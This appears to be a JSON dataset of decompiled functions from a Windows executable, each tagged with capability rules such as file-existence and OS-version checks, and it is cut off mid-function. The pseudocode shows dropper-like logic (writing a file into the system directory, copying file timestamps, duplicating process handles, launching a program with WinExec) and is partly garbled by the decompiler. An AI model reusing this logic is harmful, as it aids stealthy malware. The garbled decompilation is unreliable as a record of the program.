{
    "00401040": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401040(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x420894)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x420898)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x0040111e:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_124h;\n            goto code_r0x0040111e;\n        }\n        iVar2 = (**0x42089c)(iVar1, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 343
    },
    "00401640": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401640(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    char *pcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    bool bVar13;\n    uchar *puStack588;\n    uchar *puStack584;\n    uint uStack580;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar7 = &fcn.00401640::var_22fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_12ch = 0;\n    puVar7 = &fcn.00401640::var_12bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    puStack584 = &stack0xfffffdcc;\n    uStack580 = 0x104;\n    *(puVar7 + 2) = 0;\n    puStack588 = 0x401696;\n    puStack588 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar4 = 0xffffffff;\n    pcVar11 = &stack0xfffffdcc;\n    do {\n        pcVar10 = pcVar11;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar10 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar10;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    puVar7 = pcVar10 + -uVar4;\n    puVar9 = &stack0xfffffed0;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar9 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar4 = uVar4 & 3;\n    bVar13 = uVar4 != 0;\n    for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    puVar6 = &stack0xfffffffc;\n    if ((bVar13) && (puVar6 = &stack0xfffffffc,  !bVar13)) {\n        puVar7 = &stack0xfffffdb4;\n        puVar6 = &stack0xfffffdb4;\n        puStack588 = &stack0xfffffffc;\n        cVar1 = '\\x10';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar8;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar4 = 0xffffffff;\n    pcVar11 = 0x4203b8;\n    do {\n        pcVar10 = pcVar11;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar10 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar10;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar11 = puVar6 + -300;\n    do {\n        pcVar12 = pcVar11;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar12 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar12;\n    } while (cVar1 != '\\0');\n    puVar8 = pcVar10 + -uVar4;\n    puVar7 = pcVar12 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar7 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    puStack588 = puVar6 + -0x28;\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar6 + -300, 0);\n    iVar3 = *(puVar6 + 0xc);\n    if (iVar3 == -1) {\n        iVar2 = fcn.00401000(*(puVar6 + 8));\n        if (iVar2 == -1) {\n            return 0;\n        }\n    }\n    else {\n        iVar2 = *(puVar6 + -4);\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, puVar6 + -0x24, puVar6 + -0x1c, puVar6 + -0x14);\n    if (iVar3 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1453
    },
    "00401bf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00401bf0(void)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    uint *puVar5;\n    char in_AF;\n    bool bVar6;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar5 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iVar4 = fcn.004034e0(0x80000002, 0x4207f0, 0x420830, &var_8h, &var_210h, &var_4h);\n    bVar6 = iVar4 == 0;\n    if (bVar6) {\n        return false;\n    }\n    if ((!bVar6) && (bVar6)) {\n        if (unaff_EBX + 1 == 0) {\n            return false;\n        }\n        piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    iVar2 = *0x10;\n    iVar4 = (*_sym.imp.MSVCRT.dll__access)(iVar2 + -0x214, 0);\n    if (iVar4 != -1) {\n        iVar4 = fcn.00401aa0(iVar2 + -0x214, iVar2 + -0x110);\n        pcVar3 = _sym.imp.MSVCRT.dll_strstr;\n        if (iVar4 == 0) {\n            return false;\n        }\n        iVar4 = (*_sym.imp.MSVCRT.dll_strstr)(iVar2 + -0x110, 0x848);\n        if (iVar4 != 0) {\n            return true;\n        }\n        iVar4 = (*pcVar3)(iVar2 + -0x110, 0x84c);\n        return iVar4 != 0;\n    }\n    return false;\n}\n",
        "token_count": 562
    },
    "00402a00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00402a00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4203a0, 0xec, arg_8h);\n    fcn.004031a0(&var_8h, &var_4h);\n    iVar1 = fcn.00401910(arg_8h, arg_ch, arg_10h, arg_14h, var_8h, var_4h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *0x4208a0 = fcn.00401bf0();\n    iVar1 = fcn.00403970(&s, var_8h, var_4h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00401dc0();\n    iVar1 = fcn.00401040(0x4203d8);\n    if (iVar1 == -1) {\n        iVar1 = fcn.00401040(0x4203cc);\n        if (iVar1 == -1) goto code_r0x00402bbd;\n        arg_8h_00 = 0xf;\n    }\n    else {\n        arg_8h_00 = 0xe;\n    }\n    iVar1 = fcn.004029d0(arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.00404990(arg_8h_00);\n        fcn.004032e0(arg_8h_00);\n        return 1;\n    }\ncode_r0x00402bbd:\n    iVar1 = fcn.004015c0(arg_8h, &s);\n    uVar2 = iVar1 != 0;\n    if ((uVar2 != 0) && (iVar1 = fcn.004046f0(arg_8h),  iVar1 == 0)) {\n        uVar2 = 0;\n    }\n    if (uVar2 == 0) {\n        uVar2 = fcn.00403e20(arg_8h, 0);\n    }\n    if (uVar2 != 0) {\n        fcn.004032e0(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xe8);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x4203ec, 0);\n    return uVar2;\n}\n",
        "token_count": 838
    },
    "00403230": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00403230(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00401000(0x420380);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "004032e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403483) overlaps instruction at (ram,0x00403481)\n// \n// WARNING: Removing unreachable block (ram,0x00403366)\n// WARNING: Removing unreachable block (ram,0x004033d5)\n// WARNING: Removing unreachable block (ram,0x004033df)\n\nuint __cdecl fcn.004032e0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar s;\n    uint var_207h;\n    uint var_8h;\n    uint var_4h;\n    \n    s = 0;\n    puVar5 = &fcn.004032e0::var_207h;\n    for (iVar4 = 0x7f; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iVar4 = fcn.004036c0();\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if (arg_8h == -1) {\n        iVar4 = fcn.00403620();\n        if (iVar4 == 0) {\n            if ((-1 < iVar4) && (-1 >= iVar4)) {\n                out(0xc4, 0);\n            }\n            arg_8h = 0xd;\n        }\n        else {\n            arg_8h = 0xc;\n        }\n    }\n    iVar4 = (**0x4208b0)();\n    if (iVar4 == 0) {\n        uVar1 = (**0x4208b8)();\n        (*_sym.imp.MSVCRT.dll_sprintf)(&stack0xfffffdf4, 0x4205f0, uVar1, arg_8h);\n        iVar4 = (**0x4208b4)(0x4208c4, 0, 0, 0, 0);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        var_4h = 3000;\n        iVar2 = (**0x4208ac)(iVar4, 2, &fcn.004032e0::var_4h, 4);\n        pcVar3 = iVar2 + 0x68006a;\n        *pcVar3 = *pcVar3 + pcVar3;\n        iVar2 = (**0x4208a8)(iVar4, &stack0xfffffdf4, 0);\n        if (iVar2 != 0) {\n            (**0x4208bc)(iVar2);\n            (**0x4208bc)(iVar4);\n            return 1;\n        }\n        (**0x4208bc)(iVar4);\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 652
    },
    "00403620": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00403620(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar1 = fcn.004034e0(0x80000001, 0x42060c, 0x420638, uVar2 - 8, uVar2 - 0x10c, uVar2 - 4);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.004035a0(uVar2 - 0x10c);\n    return iVar1 != -1;\n}\n",
        "token_count": 275
    },
    "004038b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403954) overlaps instruction at (ram,0x00403952)\n// \n// WARNING: Removing unreachable block (ram,0x00403916)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004038b0(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char extraout_CH;\n    uint8_t *unaff_EBX;\n    int32_t unaff_EDI;\n    ulong uVar3;\n    uint uStackY56;\n    uint uStackY52;\n    \n    uVar3 = fcn.00401040(0x4203ec);\n    if (uVar3 == -1) {\n        return 0;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    pcVar1 = (uVar3 >> 0x20) + 0x40;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uStackY52 = arg_8h;\n    uStackY56 = 0x403934;\n    uStackY56 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *(unaff_EDI + 0x56) = *(unaff_EDI + 0x56) - &stack0xffffffc8;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return 1;\n}\n",
        "token_count": 382
    },
    "00403970": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403986) overlaps instruction at (ram,0x00403984)\n// \n\nuint fcn.00403970(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int32_t arg_8h;\n    uint32_t uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int16_t extraout_CX;\n    int16_t iVar6;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint8_t *puVar7;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    uint8_t in_AF;\n    bool bVar8;\n    bool bVar9;\n    ulong uVar10;\n    \n    while( true ) {\n        uVar10 = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_1, 0x40000000, 1, 0, 2, 0x80, 0);\n        arg_8h = uVar10;\n        bVar8 = arg_8h == -1;\n        if (bVar8) {\n            return 0;\n        }\n        if ((bVar8) || (!bVar8)) {\n            iVar6 = *0x10 + 4;\n            uVar10 = CONCAT44(param_3, param_2);\n        }\n        else {\n            uVar1 = in(uVar10 >> 0x20);\n            *unaff_EDI = uVar1;\n            unaff_EDI = unaff_EDI + 1;\n            iVar6 = extraout_CX;\n            if (&stack0xfffffffd < 1) goto code_r0x00403a2b;\n        }\n        puVar7 = uVar10 >> 0x20;\n        uVar3 = uVar10 ^ 0xdee0ed6d;\n        *(unaff_EBX + 0x458b1055) = *(unaff_EBX + 0x458b1055) ^ iVar6;\n        *puVar7 = *puVar7 | iVar6 >> 8;\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                          (arg_8h, uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31 | 0x8d, puVar7);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        bVar9 = false;\n        bVar8 = *0x4208a0 == 0;\n        iVar4 = extraout_ECX;\n        if (!bVar8) {\n            iVar4 = fcn.004038b0(arg_8h);\n            bVar9 = SCARRY4(-(iVar4 != 0), 1);\n            *0x4208a0 = -(iVar4 != 0) + 1;\n            bVar8 = *0x4208a0 == 0;\n            iVar4 = extraout_ECX_00;\n        }\n        if ((bVar8 || bVar9 != *0x4208a0 < 0) || (!bVar8 && bVar9 == *0x4208a0 < 0)) break;\n        in_AF = 9 < (*0x4208a0 & 0xf) | in_AF;\n        uVar2 = *0x4208a0 + in_AF * '\\x06';\n        pcVar5 = *0x4208a0 & 0xffff0000 | CONCAT11((*0x4208a0 >> 8) + in_AF, uVar2) & 0xff0f;\n        if (iVar4 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar5 = *pcVar5 + (uVar2 & 0xf);\n    }\n    fcn.00401640(0, arg_8h);\n    if (*0x4208a0 != 0) {\n        return 1;\n    }\ncode_r0x00403a2b:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return 1;\n}\n",
        "token_count": 929
    },
    "00403a40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a51) overlaps instruction at (ram,0x00403a4f)\n// \n\nint64_t __cdecl fcn.00403a40(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    code *pcVar3;\n    int32_t in_EDX;\n    char in_SF;\n    char in_OF;\n    ulong uVar4;\n    \n    if (in_OF == in_SF) {\n        if (in_OF != in_SF) {\n            puVar1 = in_EDX + -1;\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 + in_EAX;\n            pcVar3 = sym.imp.MSVCRT.dll__access + CARRY1(uVar2, in_EAX) + in_EDX;\n            goto code_r0x00403a5d;\n        }\n    }\n    uVar4 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    in_EAX = uVar4 >> 0x20;\n    pcVar3 = uVar4;\ncode_r0x00403a5d:\n    if (pcVar3 != 0xffffffff) {\n        return in_EAX << 0x20;\n    }\n    return CONCAT44(in_EAX, 1);\n}\n",
        "token_count": 307
    },
    "004041b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404280) overlaps instruction at (ram,0x0040427c)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: This function may have set the stack pointer\n\nbool fcn.004041b0(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uchar extraout_DL;\n    ushort extraout_DX;\n    uint *unaff_ESI;\n    uint *puVar2;\n    uint *unaff_EDI;\n    bool bVar3;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00401130();\n    bVar3 = iVar1 == 0;\n    if (bVar3) {\n        fcn.00404350();\n        return false;\n    }\n    if ((!bVar3) && (bVar3)) {\n        bVar3 = *0x10 == 0x8f;\n    }\n    fcn.004011b0();\n    puVar2 = unaff_ESI;\n    if ((!bVar3) && (bVar3)) {\n        puVar2 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    iVar1 = fcn.00401040(0x4203e4);\n    if (iVar1 != -1) {\n        iVar1 = fcn.00401040(0x4203d8);\n        if (iVar1 == -1) {\n            fcn.00404350();\n        }\n        return false;\n    }\n    fcn.00402590();\n    iVar1 = fcn.00403230();\n    bVar3 = iVar1 == 0;\n    if (!bVar3) {\n        return false;\n    }\n    if ((bVar3) || (iVar1 = extraout_ECX,  *0x32e18190 = extraout_DL,  !bVar3)) {\n        *0x32e18190 = 0;\n        iVar1 = 7;\n    }\n    *unaff_EDI = *puVar2;\n    *(iVar1 + 7) = *(iVar1 + 7) >> (iVar1 & 0x1f);\n    puVar2 = 0x32e181b1;\n    *0x32e18150 = *0x32e18190;\n    *0x32e181b0 = *0x32e18190;\n    for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = 0x32e18151;\n    *0x32e18170 = *0x32e18190;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = 0x32e18171;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = 0x32e18191;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    *0xfffffffc = 0x32e18190;\n    *0xfffffff8 = 0x32e181b0;\n    *0xfffffff4 = 0x32e18170;\n    *0xfffffff0 = 0x32e18150;\n    *0xffffffec = 0x4042df;\n    iVar1 = fcn.00404050();\n    if (iVar1 == 0) {\n        return false;\n    }\n    *0xfffffffc = 0x32e181b0;\n    *0xfffffff8 = 0x404301;\n    iVar1 = fcn.00402c90();\n    if (iVar1 == 0) {\n        return false;\n    }\n    *0xfffffffc = 0x32e18190;\n    *0xfffffff8 = 0x32e181b0;\n    *0xfffffff4 = 0x32e18170;\n    *0xfffffff0 = 0x32e18150;\n    *0xffffffec = 0x404331;\n    iVar1 = fcn.00402a00(0x32e18150, 0x32e18170, 0x32e181b0, 0x32e18190);\n    return iVar1 != 0;\n}\n",
        "token_count": 1160
    },
    "00404520": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004046da) overlaps instruction at (ram,0x004046d7)\n// \n// WARNING: Removing unreachable block (ram,0x0040469d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl\nfcn.00404520(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar6 = false;\n    uVar3 = fcn.00401430(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    if ((!bVar6) && (bVar6)) {\n        out(0xbd, uVar3);\n        return uVar3;\n    }\n    fcn.00401430(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00401430(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00401430(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar4 = fcn.004044d0();\n    if (iVar4 == -1) {\n        iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar4 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar4;\n    }\n    var_10ch = 0;\n    puVar5 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    *(puVar5 + 2) = 0;\n    iVar4 = fcn.004034e0(0x80000001, 0x42060c, 0x420638, &var_8h, &var_10ch, &var_4h);\n    if (iVar4 != 0) {\n        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x420688);\n        if (iVar4 == 0) {\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n            iVar4 = arg_20h;\n        }\n    }\n    iVar4 = CONCAT31(iVar4 >> 8, 0x98);\n    puVar1 = iVar4 + 0x12088;\n    *puVar1 = *puVar1 & 0x98;\n    pcVar2 = iVar4 + -0x74a4a1a1;\n    *pcVar2 = *pcVar2 + -0x68;\n    uVar3 = in(0x5d);\n    return uVar3;\n}\n",
        "token_count": 808
    },
    "00401130": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00401130(void)\n\n{\n    uint uVar1;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((4 < var_90h) && (4 >= var_90h)) {\n        out(0xbd, uVar1);\n        return uVar1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 167
    },
    "00401e50": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401fbd) overlaps instruction at (ram,0x00401fbc)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402272)\n// WARNING: Removing unreachable block (ram,0x00402361)\n\nvoid fcn.00401e50(void)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    ushort uVar3;\n    uint8_t extraout_AH;\n    int16_t iVar4;\n    uint uVar5;\n    uint8_t extraout_CL;\n    uint16_t extraout_CX;\n    uint16_t extraout_CX_00;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    char extraout_CH;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    int32_t extraout_ECX_08;\n    int32_t extraout_ECX_09;\n    char extraout_CH_00;\n    uint extraout_ECX_10;\n    char extraout_CH_01;\n    uint extraout_ECX_11;\n    uint16_t extraout_DX;\n    uint16_t uVar6;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    ushort extraout_DX_02;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t *piVar7;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    uint extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint8_t **ppuVar14;\n    uint8_t **ppuVar15;\n    uint32_t *puVar16;\n    uint32_t unaff_EBP;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    uint uVar20;\n    uchar *puVar21;\n    uint *unaff_EDI;\n    uint *puVar22;\n    uint8_t *puVar23;\n    uint *puVar24;\n    char *pcVar25;\n    char *pcVar26;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    bool in_CF;\n    bool bVar27;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar28;\n    uchar uVar29;\n    char cVar30;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar31;\n    bool bVar32;\n    char cVar33;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 extraout_ST0;\n    ulong uVar34;\n    unkbyte6 Var35;\n    uint in_stack_ffffffd4;\n    